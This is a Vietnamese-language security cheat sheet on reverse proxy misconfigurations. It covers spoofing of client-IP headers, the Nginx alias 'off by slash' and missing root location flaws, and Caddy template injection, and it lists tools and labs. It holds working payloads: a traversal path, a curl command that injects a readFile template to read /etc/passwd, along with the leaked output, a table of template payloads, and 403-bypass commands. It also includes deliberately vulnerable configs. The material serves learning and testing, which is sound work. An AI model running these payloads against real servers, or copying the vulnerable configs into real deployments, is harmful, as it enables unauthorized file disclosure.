# Reverse Proxy Misconfigurations

> Reverse proxy là một server nằm giữa client và các backend server, chuyển tiếp request của client đến server thích hợp trong khi che giấu hạ tầng backend và thường cung cấp khả năng load balancing hoặc caching. Các cấu hình sai trong reverse proxy, chẳng hạn như kiểm soát truy cập không đúng, thiếu input sanitization trong các chỉ thị `proxy_pass`, hoặc tin tưởng các header do client cung cấp như `X-Forwarded-For`, có thể dẫn đến các lỗ hổng như truy cập trái phép, directory traversal hoặc làm lộ các tài nguyên nội bộ.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)

  * [HTTP Headers](#http-headers)

    * [X-Forwarded-For](#x-forwarded-for)
    * [X-Real-IP](#x-real-ip)
    * [True-Client-IP](#true-client-ip)
  * [Nginx](#nginx)

    * [Off By Slash](#off-by-slash)
    * [Missing Root Location](#missing-root-location)
  * [Caddy](#caddy)

    * [Template Injection](#template-injection)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* https://github.com/yandex/gixy - Công cụ static analyzer cho cấu hình Nginx.
* https://github.com/MegaManSec/Gixy-Next - Fork của gixy được duy trì tích cực, viết bằng Python3.
* https://github.com/shiblisec/Kyubi - Công cụ dùng để phát hiện lỗi cấu hình Nginx alias traversal.
* https://github.com/laluka/bypass-url-parser - Công cụ kiểm thử NHIỀU kỹ thuật bypass URL để truy cập một page được bảo vệ bằng mã 40X.

  ```ps1
  bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d
  bypass-url-parser -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test"
  bypass-url-parser -R /path/request_file --request-tls -m "mid_paths, end_paths"
  ```

## Phương pháp

### HTTP Headers

Vì các header như `X-Forwarded-For`, `X-Real-IP` và `True-Client-IP` chỉ là các HTTP header thông thường, client có thể tự thiết lập hoặc ghi đè chúng nếu có khả năng kiểm soát một phần đường đi của traffic — đặc biệt khi kết nối trực tiếp đến application server hoặc khi reverse proxy không lọc hay xác thực đúng các header này.

#### X-Forwarded-For

`X-Forwarded-For` là một HTTP header được sử dụng để xác định địa chỉ IP ban đầu của client khi client kết nối đến web server thông qua HTTP proxy hoặc load balancer.

Khi client gửi request thông qua proxy hoặc load balancer, proxy đó sẽ thêm header `X-Forwarded-For` chứa địa chỉ IP thực của client.

Nếu có nhiều proxy (request đi qua nhiều proxy), mỗi proxy sẽ thêm địa chỉ mà nó nhận request từ đó vào header, được phân tách bằng dấu phẩy.

```ps1
X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
```

Nginx có thể ghi đè header bằng địa chỉ IP thực của client.

```ps1
proxy_set_header X-Forwarded-For $remote_addr;
```

#### X-Real-IP

`X-Real-IP` là một HTTP header tùy chỉnh khác, thường được Nginx và một số proxy khác sử dụng để chuyển tiếp IP gốc của client. Thay vì chứa một chuỗi nhiều địa chỉ IP như `X-Forwarded-For`, `X-Real-IP` chỉ chứa một IP duy nhất: địa chỉ của client kết nối đến proxy đầu tiên.

#### True-Client-IP

`True-Client-IP` là một header được một số nhà cung cấp phát triển và chuẩn hóa, đặc biệt là Akamai, nhằm truyền địa chỉ IP gốc của client qua hạ tầng của họ.

### Nginx

#### Off By Slash

Nginx so khớp URI của request đến với các `location` block được định nghĩa trong cấu hình.

* `location /app/` match các request đến `/app/`, `/app/foo`, `/app/bar/123`, v.v.
* `location /app` (không có slash ở cuối) match `/app*` (tức là `/application`, `/appfile`, v.v.),

Điều này có nghĩa là trong Nginx, việc có hoặc không có slash ở cuối một `location` block sẽ thay đổi logic matching.

```ps1
server {
  location /app/ {
    # Handles /app/ and anything below, e.g., /app/foo
  }
  location /app {
    # Handles only /app with nothing after OR routes like /application, /appzzz
  }
}
```

Ví dụ về một cấu hình dễ bị tấn công: attacker gửi request đến `/styles../secret.txt`, request này được resolve thành `/path/styles/../secret.txt`

```ps1
location /styles {
  alias /path/css/;
}
```

#### Missing Root Location

Directive `root /etc/nginx;` thiết lập thư mục root của server cho các static file.

Cấu hình không có một root location `/`, vì vậy nó sẽ được thiết lập global.

Request đến `/nginx.conf` sẽ được resolve thành `/etc/nginx/nginx.conf`.

```ps1
server {
  root /etc/nginx;

  location /hello.txt {
    try_files $uri $uri/ =404;
    proxy_pass http://127.0.0.1:8080/;
  }
}
```

### Caddy

#### Template Injection

Cấu hình Caddy web server được cung cấp sử dụng directive `templates`, cho phép render nội dung động bằng Go templates.

```ps1
:80 {
    root * /
    templates
    respond "You came from {http.request.header.Referer}"
}
```

Điều này yêu cầu Caddy xử lý chuỗi response như một template và nội suy bất kỳ biến nào (sử dụng cú pháp Go template) xuất hiện trong request header được tham chiếu.

Trong curl request này, attacker cung cấp một biểu thức Go template làm header `Referer`: `{{readFile "etc/passwd"}}`.

```ps1
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
```

```ps1
HTTP/1.1 200 OK
Content-Length: 716
Content-Type: text/plain; charset=utf-8
Server: Caddy
Date: Thu, 24 Jul 2025 08:00:50 GMT

You came from root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

Vì Caddy đang chạy directive `templates`, nó sẽ đánh giá bất kỳ nội dung nào nằm trong dấu ngoặc nhọn trong context, bao gồm cả nội dung đến từ input không đáng tin cậy. Hàm `readFile` có sẵn trong Caddy templates, vì vậy input của attacker khiến Caddy thực sự đọc `/etc/passwd` và chèn nội dung của file đó vào HTTP response.

| Payload                       | Description                           |
| ----------------------------- | ------------------------------------- |
| `{{env "VAR_NAME"}}`          | Lấy một environment variable          |
| `{{listFiles "/"}}`           | Liệt kê tất cả file trong một thư mục |
| `{{readFile "path/to/file"}}` | Đọc một file                          |

## Labs

* [Root Me - Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)
* [Root Me - Nginx - Root Location Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration)
* [Root Me - Nginx - SSRF Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)
* [Detectify - Vulnerable Nginx](https://github.com/detectify/vulnerable-nginx)

## Tài liệu tham khảo

* [What is X-Forwarded-For and when can you trust it? - Phil Sturgeonopens - January 31, 2024](https://web.archive.org/web/20260112224231/https://httptoolkit.com/blog/what-is-x-forwarded-for/)
* [Common Nginx misconfigurations that leave your web server open to attack - Detectify - November 10, 2020](https://web.archive.org/web/20260227155031/https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)
